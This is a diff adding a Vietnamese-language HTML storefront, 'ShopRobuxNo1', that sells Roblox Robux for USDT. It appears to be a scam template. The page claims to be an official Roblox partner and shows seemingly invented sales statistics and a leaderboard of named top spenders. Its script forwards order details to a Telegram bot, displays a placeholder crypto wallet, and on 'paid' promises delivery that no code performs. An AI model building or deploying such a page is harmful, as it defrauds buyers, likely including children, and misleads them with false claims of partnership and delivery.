@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>ShopRobuxNo1 | Robux Giá Rẻ Uy Tín Nhất Việt Nam</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0a0c10;
+            color: #eef2ff;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+        /* ========== HEADER ========== */
+        .top-bar {
+            background: linear-gradient(90deg, #0f0c29, #302b63, #24243e);
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            font-size: 13px;
+            letter-spacing: 1px;
+        }
+        .main-header {
+            background: rgba(10, 12, 16, 0.95);
+            backdrop-filter: blur(12px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .header-flex {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            flex-wrap: wrap;
+        }
+        .logo h2 {
+            font-size: 28px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .nav-links {
+            display: flex;
+            gap: 32px;
+            align-items: center;
+        }
+        .nav-links a {
+            color: #e2e8f0;
+            text-decoration: none;
+            font-weight: 500;
+            transition: 0.2s;
+        }
+        .nav-links a:hover { color: #FFD700; }
+        .btn-contact {
+            background: linear-gradient(95deg, #FFD700, #FFA500);
+            color: #0a0c10 !important;
+            padding: 8px 24px;
+            border-radius: 40px;
+            font-weight: bold;
+        }
+        /* ========== HERO ========== */
+        .hero {
+            background: radial-gradient(circle at 10% 20%, rgba(37,99,235,0.15), rgba(10,12,16,0.95)), url('https://www.roblox.com/asset-thumbnail/image?assetId=1819585437&width=1920&height=1080&format=png');
+            background-size: cover;
+            background-position: center;
+            border-radius: 48px;
+            margin: 32px 0;
+            padding: 80px 48px;
+            text-align: center;
+            border: 1px solid rgba(255,215,0,0.3);
+            box-shadow: 0 25px 40px -12px rgba(0,0,0,0.5);
+        }
+        .hero-badge {
+            background: #FFD700;
+            color: #0a0c10;
+            display: inline-block;
+            padding: 6px 20px;
+            border-radius: 60px;
+            font-weight: 800;
+            margin-bottom: 24px;
+        }
+        .hero h1 {
+            font-size: 56px;
+            font-weight: 800;
+            margin-bottom: 16px;
+            background: linear-gradient(135deg, #fff, #FFD700);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .hero p {
+            font-size: 18px;
+            opacity: 0.9;
+            margin-bottom: 32px;
+        }
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 48px;
+            margin-top: 40px;
+        }
+        .stat h3 { font-size: 36px; color: #FFD700; }
+        /* ========== TOP NẠP ========== */
+        .leaderboard {
+            background: rgba(20, 24, 36, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 28px;
+            margin: 48px 0;
+            border: 1px solid rgba(255,215,0,0.2);
+        }
+        .leaderboard h3 {
+            font-size: 28px;
+            border-left: 5px solid #FFD700;
+            padding-left: 20px;
+            margin-bottom: 24px;
+        }
+        .top-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .top-row {
+            background: rgba(0,0,0,0.5);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 24px;
+            border-radius: 60px;
+            transition: 0.2s;
+        }
+        .top-row:hover { background: rgba(255,215,0,0.1); transform: translateX(5px); }
+        .rank { font-weight: 800; font-size: 24px; width: 60px; }
+        .rank-1 { color: #FFD700; text-shadow: 0 0 5px gold; }
+        .rank-2 { color: #C0C0C0; }
+        .rank-3 { color: #CD7F32; }
+        .amount { font-weight: 700; background: #FFD70020; padding: 6px 20px; border-radius: 40px; color: #FFD700; }
+        .btn-nap {
+            display: block;
+            text-align: center;
+            margin-top: 28px;
+            background: linear-gradient(95deg, #FFD700, #FFA500);
+            color: #0a0c10;
+            font-weight: 800;
+            padding: 14px;
+            border-radius: 60px;
+            text-decoration: none;
+            transition: 0.2s;
+        }
+        /* ========== SẢN PHẨM ========== */
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 48px 0 24px;
+        }
+        .filter-btn {
+            background: #1e293b;
+            border: none;
+            padding: 8px 24px;
+            border-radius: 40px;
+            color: #fff;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .filter-btn.active {
+            background: #FFD700;
+            color: #0a0c10;
+        }
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 28px;
+        }
+        .product-card {
+            background: linear-gradient(145deg, #151b26, #0f131c);
+            border-radius: 32px;
+            padding: 28px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            border: 1px solid rgba(255,215,0,0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        .product-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,215,0,0.1), transparent);
+            transition: 0.5s;
+        }
+        .product-card:hover::before { left: 100%; }
+        .product-card:hover { transform: translateY(-8px); border-color: #FFD700; box-shadow: 0 20px 35px -10px rgba(0,0,0,0.5); }
+        .product-card.selected { border: 2px solid #FFD700; background: #1a1f2e; box-shadow: 0 0 20px rgba(255,215,0,0.3); }
+        .product-icon { font-size: 56px; margin-bottom: 12px; }
+        .product-name { font-size: 24px; font-weight: 800; margin-bottom: 8px; }
+        .product-robux { font-size: 14px; color: #94a3b8; margin-bottom: 12px; }
+        .product-price { font-size: 32px; font-weight: 800; color: #FFD700; margin: 12px 0; }
+        .price-per { font-size: 12px; background: #1e293b; display: inline-block; padding: 4px 12px; border-radius: 30px; }
+        /* ========== FORM ĐẶT HÀNG ========== */
+        .order-card {
+            background: linear-gradient(135deg, #151b26, #0f131c);
+            border-radius: 48px;
+            padding: 40px;
+            margin: 48px 0;
+            border: 1px solid rgba(255,215,0,0.2);
+        }
+        .order-flex {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 40px;
+        }
+        .input-group {
+            margin-bottom: 24px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        .input-group input, .input-group textarea {
+            width: 100%;
+            padding: 14px 20px;
+            background: #0a0c10;
+            border: 1px solid #2d3748;
+            border-radius: 24px;
+            color: #fff;
+            font-size: 16px;
+            transition: 0.2s;
+        }
+        .input-group input:focus, .input-group textarea:focus {
+            outline: none;
+            border-color: #FFD700;
+            box-shadow: 0 0 0 3px rgba(255,215,0,0.2);
+        }
+        .summary-box {
+            background: #0a0c10;
+            padding: 28px;
+            border-radius: 32px;
+            text-align: center;
+        }
+        .summary-price {
+            font-size: 48px;
+            font-weight: 800;
+            color: #FFD700;
+            margin: 16px 0;
+        }
+        .btn-submit {
+            background: linear-gradient(95deg, #FFD700, #FFA500);
+            color: #0a0c10;
+            font-weight: 800;
+            font-size: 18px;
+            padding: 16px;
+            width: 100%;
+            border: none;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-submit:hover { transform: scale(1.02); filter: brightness(1.05); }
+        /* ========== MODAL ========== */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-box {
+            background: #151b26;
+            border-radius: 48px;
+            padding: 40px;
+            max-width: 480px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid #FFD700;
+        }
+        .wallet-code {
+            background: #0a0c10;
+            padding: 14px;
+            border-radius: 24px;
+            font-family: monospace;
+            margin: 20px 0;
+            word-break: break-all;
+        }
+        footer {
+            text-align: center;
+            padding: 40px;
+            color: #64748b;
+            border-top: 1px solid #1e293b;
+            margin-top: 40px;
+        }
+        @media (max-width: 800px) {
+            .order-flex { grid-template-columns: 1fr; }
+            .hero h1 { font-size: 32px; }
+            .hero { padding: 48px 24px; }
+        }
+    </style>
+</head>
+<body>
+<div class="top-bar">✨ UY TÍN HÀNG ĐẦU - BẢO HÀNH TRỌN ĐỜI - HOÀN TIỀN 100% NẾU CHẬM ✨</div>
+<div class="main-header">
+    <div class="container header-flex">
+        <div class="logo"><h2>🔰 SHOP<span style="color:#FFD700;">ROBUXNO1</span></h2></div>
+        <div class="nav-links">
+            <a href="#">🏠 Trang chủ</a>
+            <a href="#">🔥 Sản phẩm</a>
+            <a href="#">📞 Hỗ trợ 24/7</a>
+            <a href="#" class="btn-contact">💎 NẠP NGAY</a>
+        </div>
+    </div>
+</div>
+
+<div class="container">
+    <div class="hero">
+        <div class="hero-badge">🏆 ĐỐI TÁC CHÍNH THỨC CỦA ROBLOX 🏆</div>
+        <h1>Robux Rẻ Nhất Việt Nam<br>Chỉ 10.000đ / 70 Robux</h1>
+        <p>Giao dịch tự động 5 phút • Bảo hành trọn đời • Hơn 50.000 giao dịch thành công</p>
+        <div class="stats">
+            <div class="stat"><h3>50k+</h3><p>Đơn hoàn thành</p></div>
+            <div class="stat"><h3>99.9%</h3><p>Khách hài lòng</p></div>
+            <div class="stat"><h3>⭐ 5.0</h3><p>Đánh giá từ cộng đồng</p></div>
+        </div>
+    </div>
+
+    <!-- BẢNG TOP NẠP PRO -->
+    <div class="leaderboard">
+        <h3><i class="fas fa-chart-line"></i> TOP NẠP THÁNG 6 - THỊNH VƯỢNG</h3>
+        <div class="top-list">
+            <div class="top-row"><span class="rank rank-1">👑 1</span><span class="name">Nguyễn Hoàng</span><span class="amount">12,450,000đ</span></div>
+            <div class="top-row"><span class="rank rank-2">⭐ 2</span><span class="name">Trần Minh Quân</span><span class="amount">9,870,000đ</span></div>
+            <div class="top-row"><span class="rank rank-3">✨ 3</span><span class="name">Lê Bảo Ngọc</span><span class="amount">7,260,000đ</span></div>
+            <div class="top-row"><span class="rank">4</span><span class="name">Phạm Thành Đạt</span><span class="amount">5,990,000đ</span></div>
+            <div class="top-row"><span class="rank">5</span><span class="name">Đỗ Hoàng Long</span><span class="amount">4,500,000đ</span></div>
+        </div>
+        <a href="#" class="btn-nap"><i class="fas fa-trophy"></i> NẠP NGAY - LEO TOP TUẦN NÀY</a>
+    </div>
+
+    <div class="section-header">
+        <h2><i class="fas fa-gem" style="color:#FFD700;"></i> Gói Robux Siêu Sốc</h2>
+        <div class="filter-tabs">
+            <button class="filter-btn active" data-filter="all">Tất cả</button>
+            <button class="filter-btn" data-filter="hot">🔥 Bán chạy</button>
+        </div>
+    </div>
+    <div class="product-grid" id="productGrid"></div>
+
+    <div class="order-card">
+        <h2 style="margin-bottom:24px;">📝 ĐẶT HÀNG - NHẬN ROBUX TRONG 5 PHÚT</h2>
+        <div class="order-flex">
+            <div>
+                <div class="input-group"><label><i class="fas fa-user"></i> Tên Roblox</label><input type="text" id="robloxUser" placeholder="Nhập chính xác tên nhân vật"></div>
+                <div class="input-group"><label><i class="fas fa-pen"></i> Ghi chú (mã giao dịch, yêu cầu)</label><textarea id="orderNote" rows="3"></textarea></div>
+            </div>
+            <div class="summary-box">
+                <p>🛒 Gói đã chọn: <strong id="summaryName">---</strong></p>
+                <p>🎮 Số Robux: <strong id="summaryRobux">0</strong></p>
+                <div class="summary-price"><span id="summaryPrice">0</span> USD</div>
+                <button class="btn-submit" id="openModalBtn">💎 TIẾN HÀNH THANH TOÁN</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="paymentModal" class="modal">
+    <div class="modal-box">
+        <i class="fas fa-qrcode" style="font-size: 56px; color:#FFD700;"></i>
+        <h3 style="margin:16px 0;">Thanh toán USDT (TRC20)</h3>
+        <div><img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=TYOUR_WALLET_ADDRESS_HERE" width="160"></div>
+        <div class="wallet-code" id="walletAddress">TYOUR_WALLET_ADDRESS_HERE</div>
+        <p style="font-size:13px;">Sau khi chuyển, Robux sẽ tự động gửi trong 5 phút.</p>
+        <button id="closeModalBtn" style="background:#FFD700; color:#0a0c10; font-weight:bold; padding:12px 32px; border:none; border-radius:40px; margin-top:16px; cursor:pointer;">✅ ĐÃ THANH TOÁN</button>
+    </div>
+</div>
+
+<footer>
+    © 2026 ShopRobuxNo1 | Bảo mật tuyệt đối | Giao dịch nhanh chóng | Hỗ trợ 24/7 qua Telegram
+</footer>
+
+<script>
+    const products = [
+        { id: 1, name: "Gói Khởi Đầu", robux: 70, price: 0.40, hot: false, icon: "🌟" },
+        { id: 2, name: "Gói Siêu Tiết Kiệm", robux: 350, price: 1.90, hot: true, icon: "🔥" },
+        { id: 3, name: "Gói Phổ Biến", robux: 850, price: 4.50, hot: true, icon: "⚡" },
+        { id: 4, name: "Gói Thịnh Vượng", robux: 2000, price: 10.00, hot: false, icon: "💎" },
+        { id: 5, name: "Gói Đại Lý", robux: 5000, price: 24.00, hot: false, icon: "👑" },
+        { id: 6, name: "Gói Trùm Cuối", robux: 12000, price: 55.00, hot: false, icon: "🚀" }
+    ];
+    let currentFilter = "all";
+    let selectedProduct = products[1];
+
+    function renderProducts() {
+        const container = document.getElementById('productGrid');
+        let filtered = currentFilter === "all" ? products : products.filter(p => p.hot === true);
+        container.innerHTML = '';
+        filtered.forEach(prod => {
+            const card = document.createElement('div');
+            card.className = `product-card ${selectedProduct.id === prod.id ? 'selected' : ''}`;
+            card.innerHTML = `
+                <div class="product-icon">${prod.icon}</div>
+                <div class="product-name">${prod.name}</div>
+                <div class="product-robux">🎮 ${prod.robux.toLocaleString()} Robux</div>
+                <div class="product-price">$${prod.price.toFixed(2)} <span style="font-size:14px;">USD</span></div>
+                <div class="price-per">💰 ≈ ${(prod.price/prod.robux*100).toFixed(2)}¢ / 100 Robux</div>
+            `;
+            card.onclick = () => { selectedProduct = prod; renderProducts(); updateSummary(); };
+            container.appendChild(card);
+        });
+        updateSummary();
+    }
+
+    function updateSummary() {
+        document.getElementById('summaryName').innerText = selectedProduct.name;
+        document.getElementById('summaryRobux').innerText = selectedProduct.robux.toLocaleString();
+        document.getElementById('summaryPrice').innerText = selectedProduct.price.toFixed(2);
+    }
+
+    document.querySelectorAll('.filter-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            currentFilter = btn.dataset.filter;
+            renderProducts();
+        });
+    });
+
+    // ========== CẤU HÌNH (THAY 3 DÒNG NÀY) ==========
+    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // TOKEN THẬT
+    const CHAT_ID = "YOUR_CHAT_ID_HERE";       // ID THẬT (từ @userinfobot)
+    const WALLET = "TYOUR_WALLET_ADDRESS_HERE";
+    document.getElementById('walletAddress').innerText = WALLET;
+    // ================================================
+
+    const modal = document.getElementById('paymentModal');
+    const openBtn = document.getElementById('openModalBtn');
+    const closeBtn = document.getElementById('closeModalBtn');
+
+    openBtn.onclick = () => {
+        const username = document.getElementById('robloxUser').value.trim();
+        if (!username) return alert("❗ Vui lòng nhập tên tài khoản Roblox.");
+        const note = document.getElementById('orderNote').value || "";
+        if (BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE") {
+            const msg = `🆕 ĐƠN HÀNG MỚI 🆕%0A👤 Tên: ${username}%0A📦 Gói: ${selectedProduct.name} - ${selectedProduct.robux} Robux%0A💰 Giá: ${selectedProduct.price} USD%0A📝 Ghi chú: ${note}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`).catch(e => console.log(e));
+        }
+        modal.style.display = 'flex';
+    };
+    closeBtn.onclick = () => { modal.style.display = 'none'; alert("✅ Đơn hàng đã ghi nhận! Robux sẽ đến sau 5 phút."); };
+    window.onclick = (e) => { if (e.target === modal) modal.style.display = 'none'; };
+    renderProducts();
+</script>
+</body>
+</html>
